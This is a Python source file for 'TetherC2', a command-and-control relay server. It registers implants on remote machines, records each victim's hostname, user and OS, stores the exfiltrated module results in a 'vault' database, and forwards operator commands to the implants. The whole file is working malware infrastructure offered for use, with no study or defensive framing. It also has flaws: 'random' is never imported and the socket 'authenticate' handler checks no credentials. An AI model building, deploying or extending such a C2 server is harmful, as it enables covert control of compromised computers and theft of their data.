# C2_Server/relay_server.py
import sys, os, sqlite3, json, time, threading, logging
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta

# --- Basic Configuration ---
INACTIVITY_PERIOD_DAYS = 180
CLEANUP_INTERVAL_SECONDS = 86400
SESSION_TIMEOUT_SECONDS = 40
SERVER_START_TIME = datetime.utcnow()

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("relay_server.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# --- App and Extensions Initialization ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"], storage_uri="memory://")
socketio = SocketIO(app, async_mode='threading')

class DatabaseManager:
    def __init__(self, db_file="tether_server.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL;")
        self.setup_schema()

    def setup_schema(self):
        with self.conn:
            self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL, assigned_line INTEGER NOT NULL, last_login TEXT)")
            self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, alias TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
            self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
            try:
                self.conn.execute("ALTER TABLE sessions ADD COLUMN alias TEXT")
            except sqlite3.OperationalError:
                pass

    def delete_all_data_for_user(self, username):
        try:
            with self.conn:
                cursor = self.conn.cursor()
                cursor.execute("SELECT session_id FROM sessions WHERE owner_username = ?", (username,))
                session_ids = [row[0] for row in cursor.fetchall()]
                if session_ids:
                    placeholders = ','.join('?' for _ in session_ids)
                    cursor.execute(f"DELETE FROM vault WHERE session_id IN ({placeholders})", session_ids)
                cursor.execute("DELETE FROM sessions WHERE owner_username = ?", (username,))
            return True
        except sqlite3.Error as e:
            logging.error(f"Database sanitize error for user {username}: {e}")
            return False

    def create_user(self, username, password_hash):
        try:
            with self.conn:
                self.conn.execute("INSERT INTO users (username, password_hash, assigned_line, last_login) VALUES (?, ?, ?, ?)", (username, password_hash, random.randint(1, 10), datetime.utcnow().isoformat()))
            return True
        except sqlite3.IntegrityError:
            return False

    def get_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT username, password_hash, assigned_line FROM users WHERE username = ?", (username,))
        return cursor.fetchone()

    def update_user_last_login(self, username):
        try:
            with self.conn:
                self.conn.execute("UPDATE users SET last_login = ? WHERE username = ?", (datetime.utcnow().isoformat(), username))
        except sqlite3.Error as e:
            logging.error(f"Failed to update last_login for {username}: {e}")

    def find_and_delete_inactive_users(self):
        logging.info(f"Running scheduled task to delete users inactive for over {INACTIVITY_PERIOD_DAYS} days...")
        try:
            with self.conn:
                cursor = self.conn.cursor()
                cutoff_date = datetime.utcnow() - timedelta(days=INACTIVITY_PERIOD_DAYS)
                cursor.execute("SELECT username FROM users WHERE last_login IS NOT NULL AND last_login < ?", (cutoff_date.isoformat(),))
                inactive_users = [row[0] for row in cursor.fetchall()]
                if not inactive_users:
                    logging.info("No inactive users found.")
                    return
                for username in inactive_users:
                    logging.warning(f"Deleting user '{username}' due to inactivity...")
                    self.delete_all_data_for_user(username)
                    cursor.execute("DELETE FROM users WHERE username = ?", (username,))
                    logging.warning(f"Successfully deleted user '{username}'.")
        except sqlite3.Error as e:
            logging.error(f"An error occurred during the inactive user cleanup task: {e}")

    def update_session_alias(self, session_id, owner_username, alias):
        cursor = self.conn.cursor()
        cursor.execute("SELECT owner_username FROM sessions WHERE session_id = ?", (session_id,))
        result = cursor.fetchone()
        if not result or result[0] != owner_username:
            return False, "Session not found or permission denied."
        try:
            with self.conn:
                self.conn.execute("UPDATE sessions SET alias = ? WHERE session_id = ?", (alias, session_id))
            return True, "Alias updated successfully."
        except sqlite3.Error as e:
            logging.error(f"Failed to update alias for session {session_id}: {e}")
            return False, "Database error."

    def create_or_update_session(self, session_id, owner_username, metadata=None):
        with self.conn:
            cursor = self.conn.cursor()
            cursor.execute("SELECT 1 FROM sessions WHERE session_id = ?", (session_id,))
            exists = cursor.fetchone()
            if exists:
                if metadata:
                    self.conn.execute("UPDATE sessions SET metadata = ? WHERE session_id = ?", (json.dumps(metadata), session_id))
            else:
                self.conn.execute("INSERT INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata or {})))

    def save_vault_data(self, session_id, module_name, data):
        with self.conn:
            self.conn.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, module_name, json.dumps(data)))

    def load_vault_data_for_user(self, username):
        user_sessions = {}
        cursor = self.conn.cursor()
        cursor.execute("SELECT session_id, metadata, alias FROM sessions WHERE owner_username = ?", (username,))
        for row in cursor.fetchall():
            user_sessions[row[0]] = {"metadata": json.loads(row[1] or '{}'), "alias": row[2]}
        vault_data = {}
        for session_id, data in user_sessions.items():
            vault_data[session_id] = {"metadata": data["metadata"], "alias": data["alias"]}
        if not user_sessions: return {}
        placeholders = ','.join('?' for _ in user_sessions)
        query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({placeholders})"
        for sid, mod_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if sid in vault_data:
                vault_data[sid][mod_name] = json.loads(data_json)
        return vault_data

db = DatabaseManager()
active_sessions = {}
session_lock = threading.Lock()
client_sids = {}

@socketio.on('connect')
def handle_connect():
    logging.info(f"C2 Client connected with sid: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logging.info(f"C2 Client disconnected: {request.sid}")
    if request.sid in client_sids:
        username = client_sids.pop(request.sid, None)
        if username:
            leave_room(username)
            logging.info(f"User '{username}' with sid {request.sid} left their room.")

@socketio.on('authenticate')
def handle_authentication(data):
    username = data.get('username')
    if username:
        join_room(username)
        client_sids[request.sid] = username
        logging.info(f"User '{username}' authenticated for sid {request.sid} and joined room.")
        emit('authentication_success', {'message': f'Successfully subscribed to updates for {username}'})

@socketio.on('task_implant')
def handle_tasking(data):
    username = client_sids.get(request.sid)
    session_id = data.get('session_id')
    command = data.get('command')
    if not all([username, session_id, command]):
        emit('tasking_error', {'error': 'Missing username, session_id, or command.'})
        return
    with session_lock:
        if active_sessions.get(session_id, {}).get('owner') == username:
            socketio.emit('execute_command', command, to=session_id)
            logging.info(f"Task sent to implant {session_id} by user {username}: {command.get('action')}")
        else:
            emit('tasking_error', {'error': 'Session not found or permission denied.'})

@app.route('/')
def index():
    return "TetherC2 Relay is operational."

@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    sid, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([sid, c2_user]):
        return jsonify({"error": "session_id and c2_user are required"}), 400

    metadata = None
    if "hostname" in data and "user" in data and "os" in data:
        metadata = {"hostname": data["hostname"], "user": data["user"], "os": data["os"]}
        logging.info(f"Received metadata for session {sid}: {metadata['user']}@{metadata['hostname']}")
    
    with session_lock:
        active_sessions[sid] = {"owner": c2_user, "last_seen": time.time()}
        db.create_or_update_session(sid, c2_user, metadata)

    if "results" in data:
        logging.info(f"Processing {len(data['results'])} result packets from session {sid}.")
        for result in data.get("results", []):
            mod_name, out_data = result.get("command"), result.get("output")
            if mod_name and out_data is not None:
                db.save_vault_data(sid, mod_name, result)
    
    return jsonify({"commands": []})

if __name__ == '__main__':
    def start_cleanup_scheduler():
        db.find_and_delete_inactive_users()
        threading.Timer(CLEANUP_INTERVAL_SECONDS, start_cleanup_scheduler).start()

    def check_offline_implants():
        while True:
            with session_lock:
                offline_sids = [sid for sid, data in active_sessions.items() if time.time() - data.get("last_seen", 0) > SESSION_TIMEOUT_SECONDS]
                for sid in offline_sids:
                    owner = active_sessions.pop(sid, {}).get('owner')
                    if owner:
                        logging.warning(f"Implant timed out: {sid}")
                        socketio.emit('session_updated', {'session_id': sid, 'status': 'Offline'}, room=owner)
            time.sleep(15)

    start_cleanup_scheduler()
    threading.Thread(target=check_offline_implants, daemon=True).start()
    port = int(os.environ.get('PORT', 5001))
    logging.info(f"TetherC2 Relay starting on port {port}.")
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)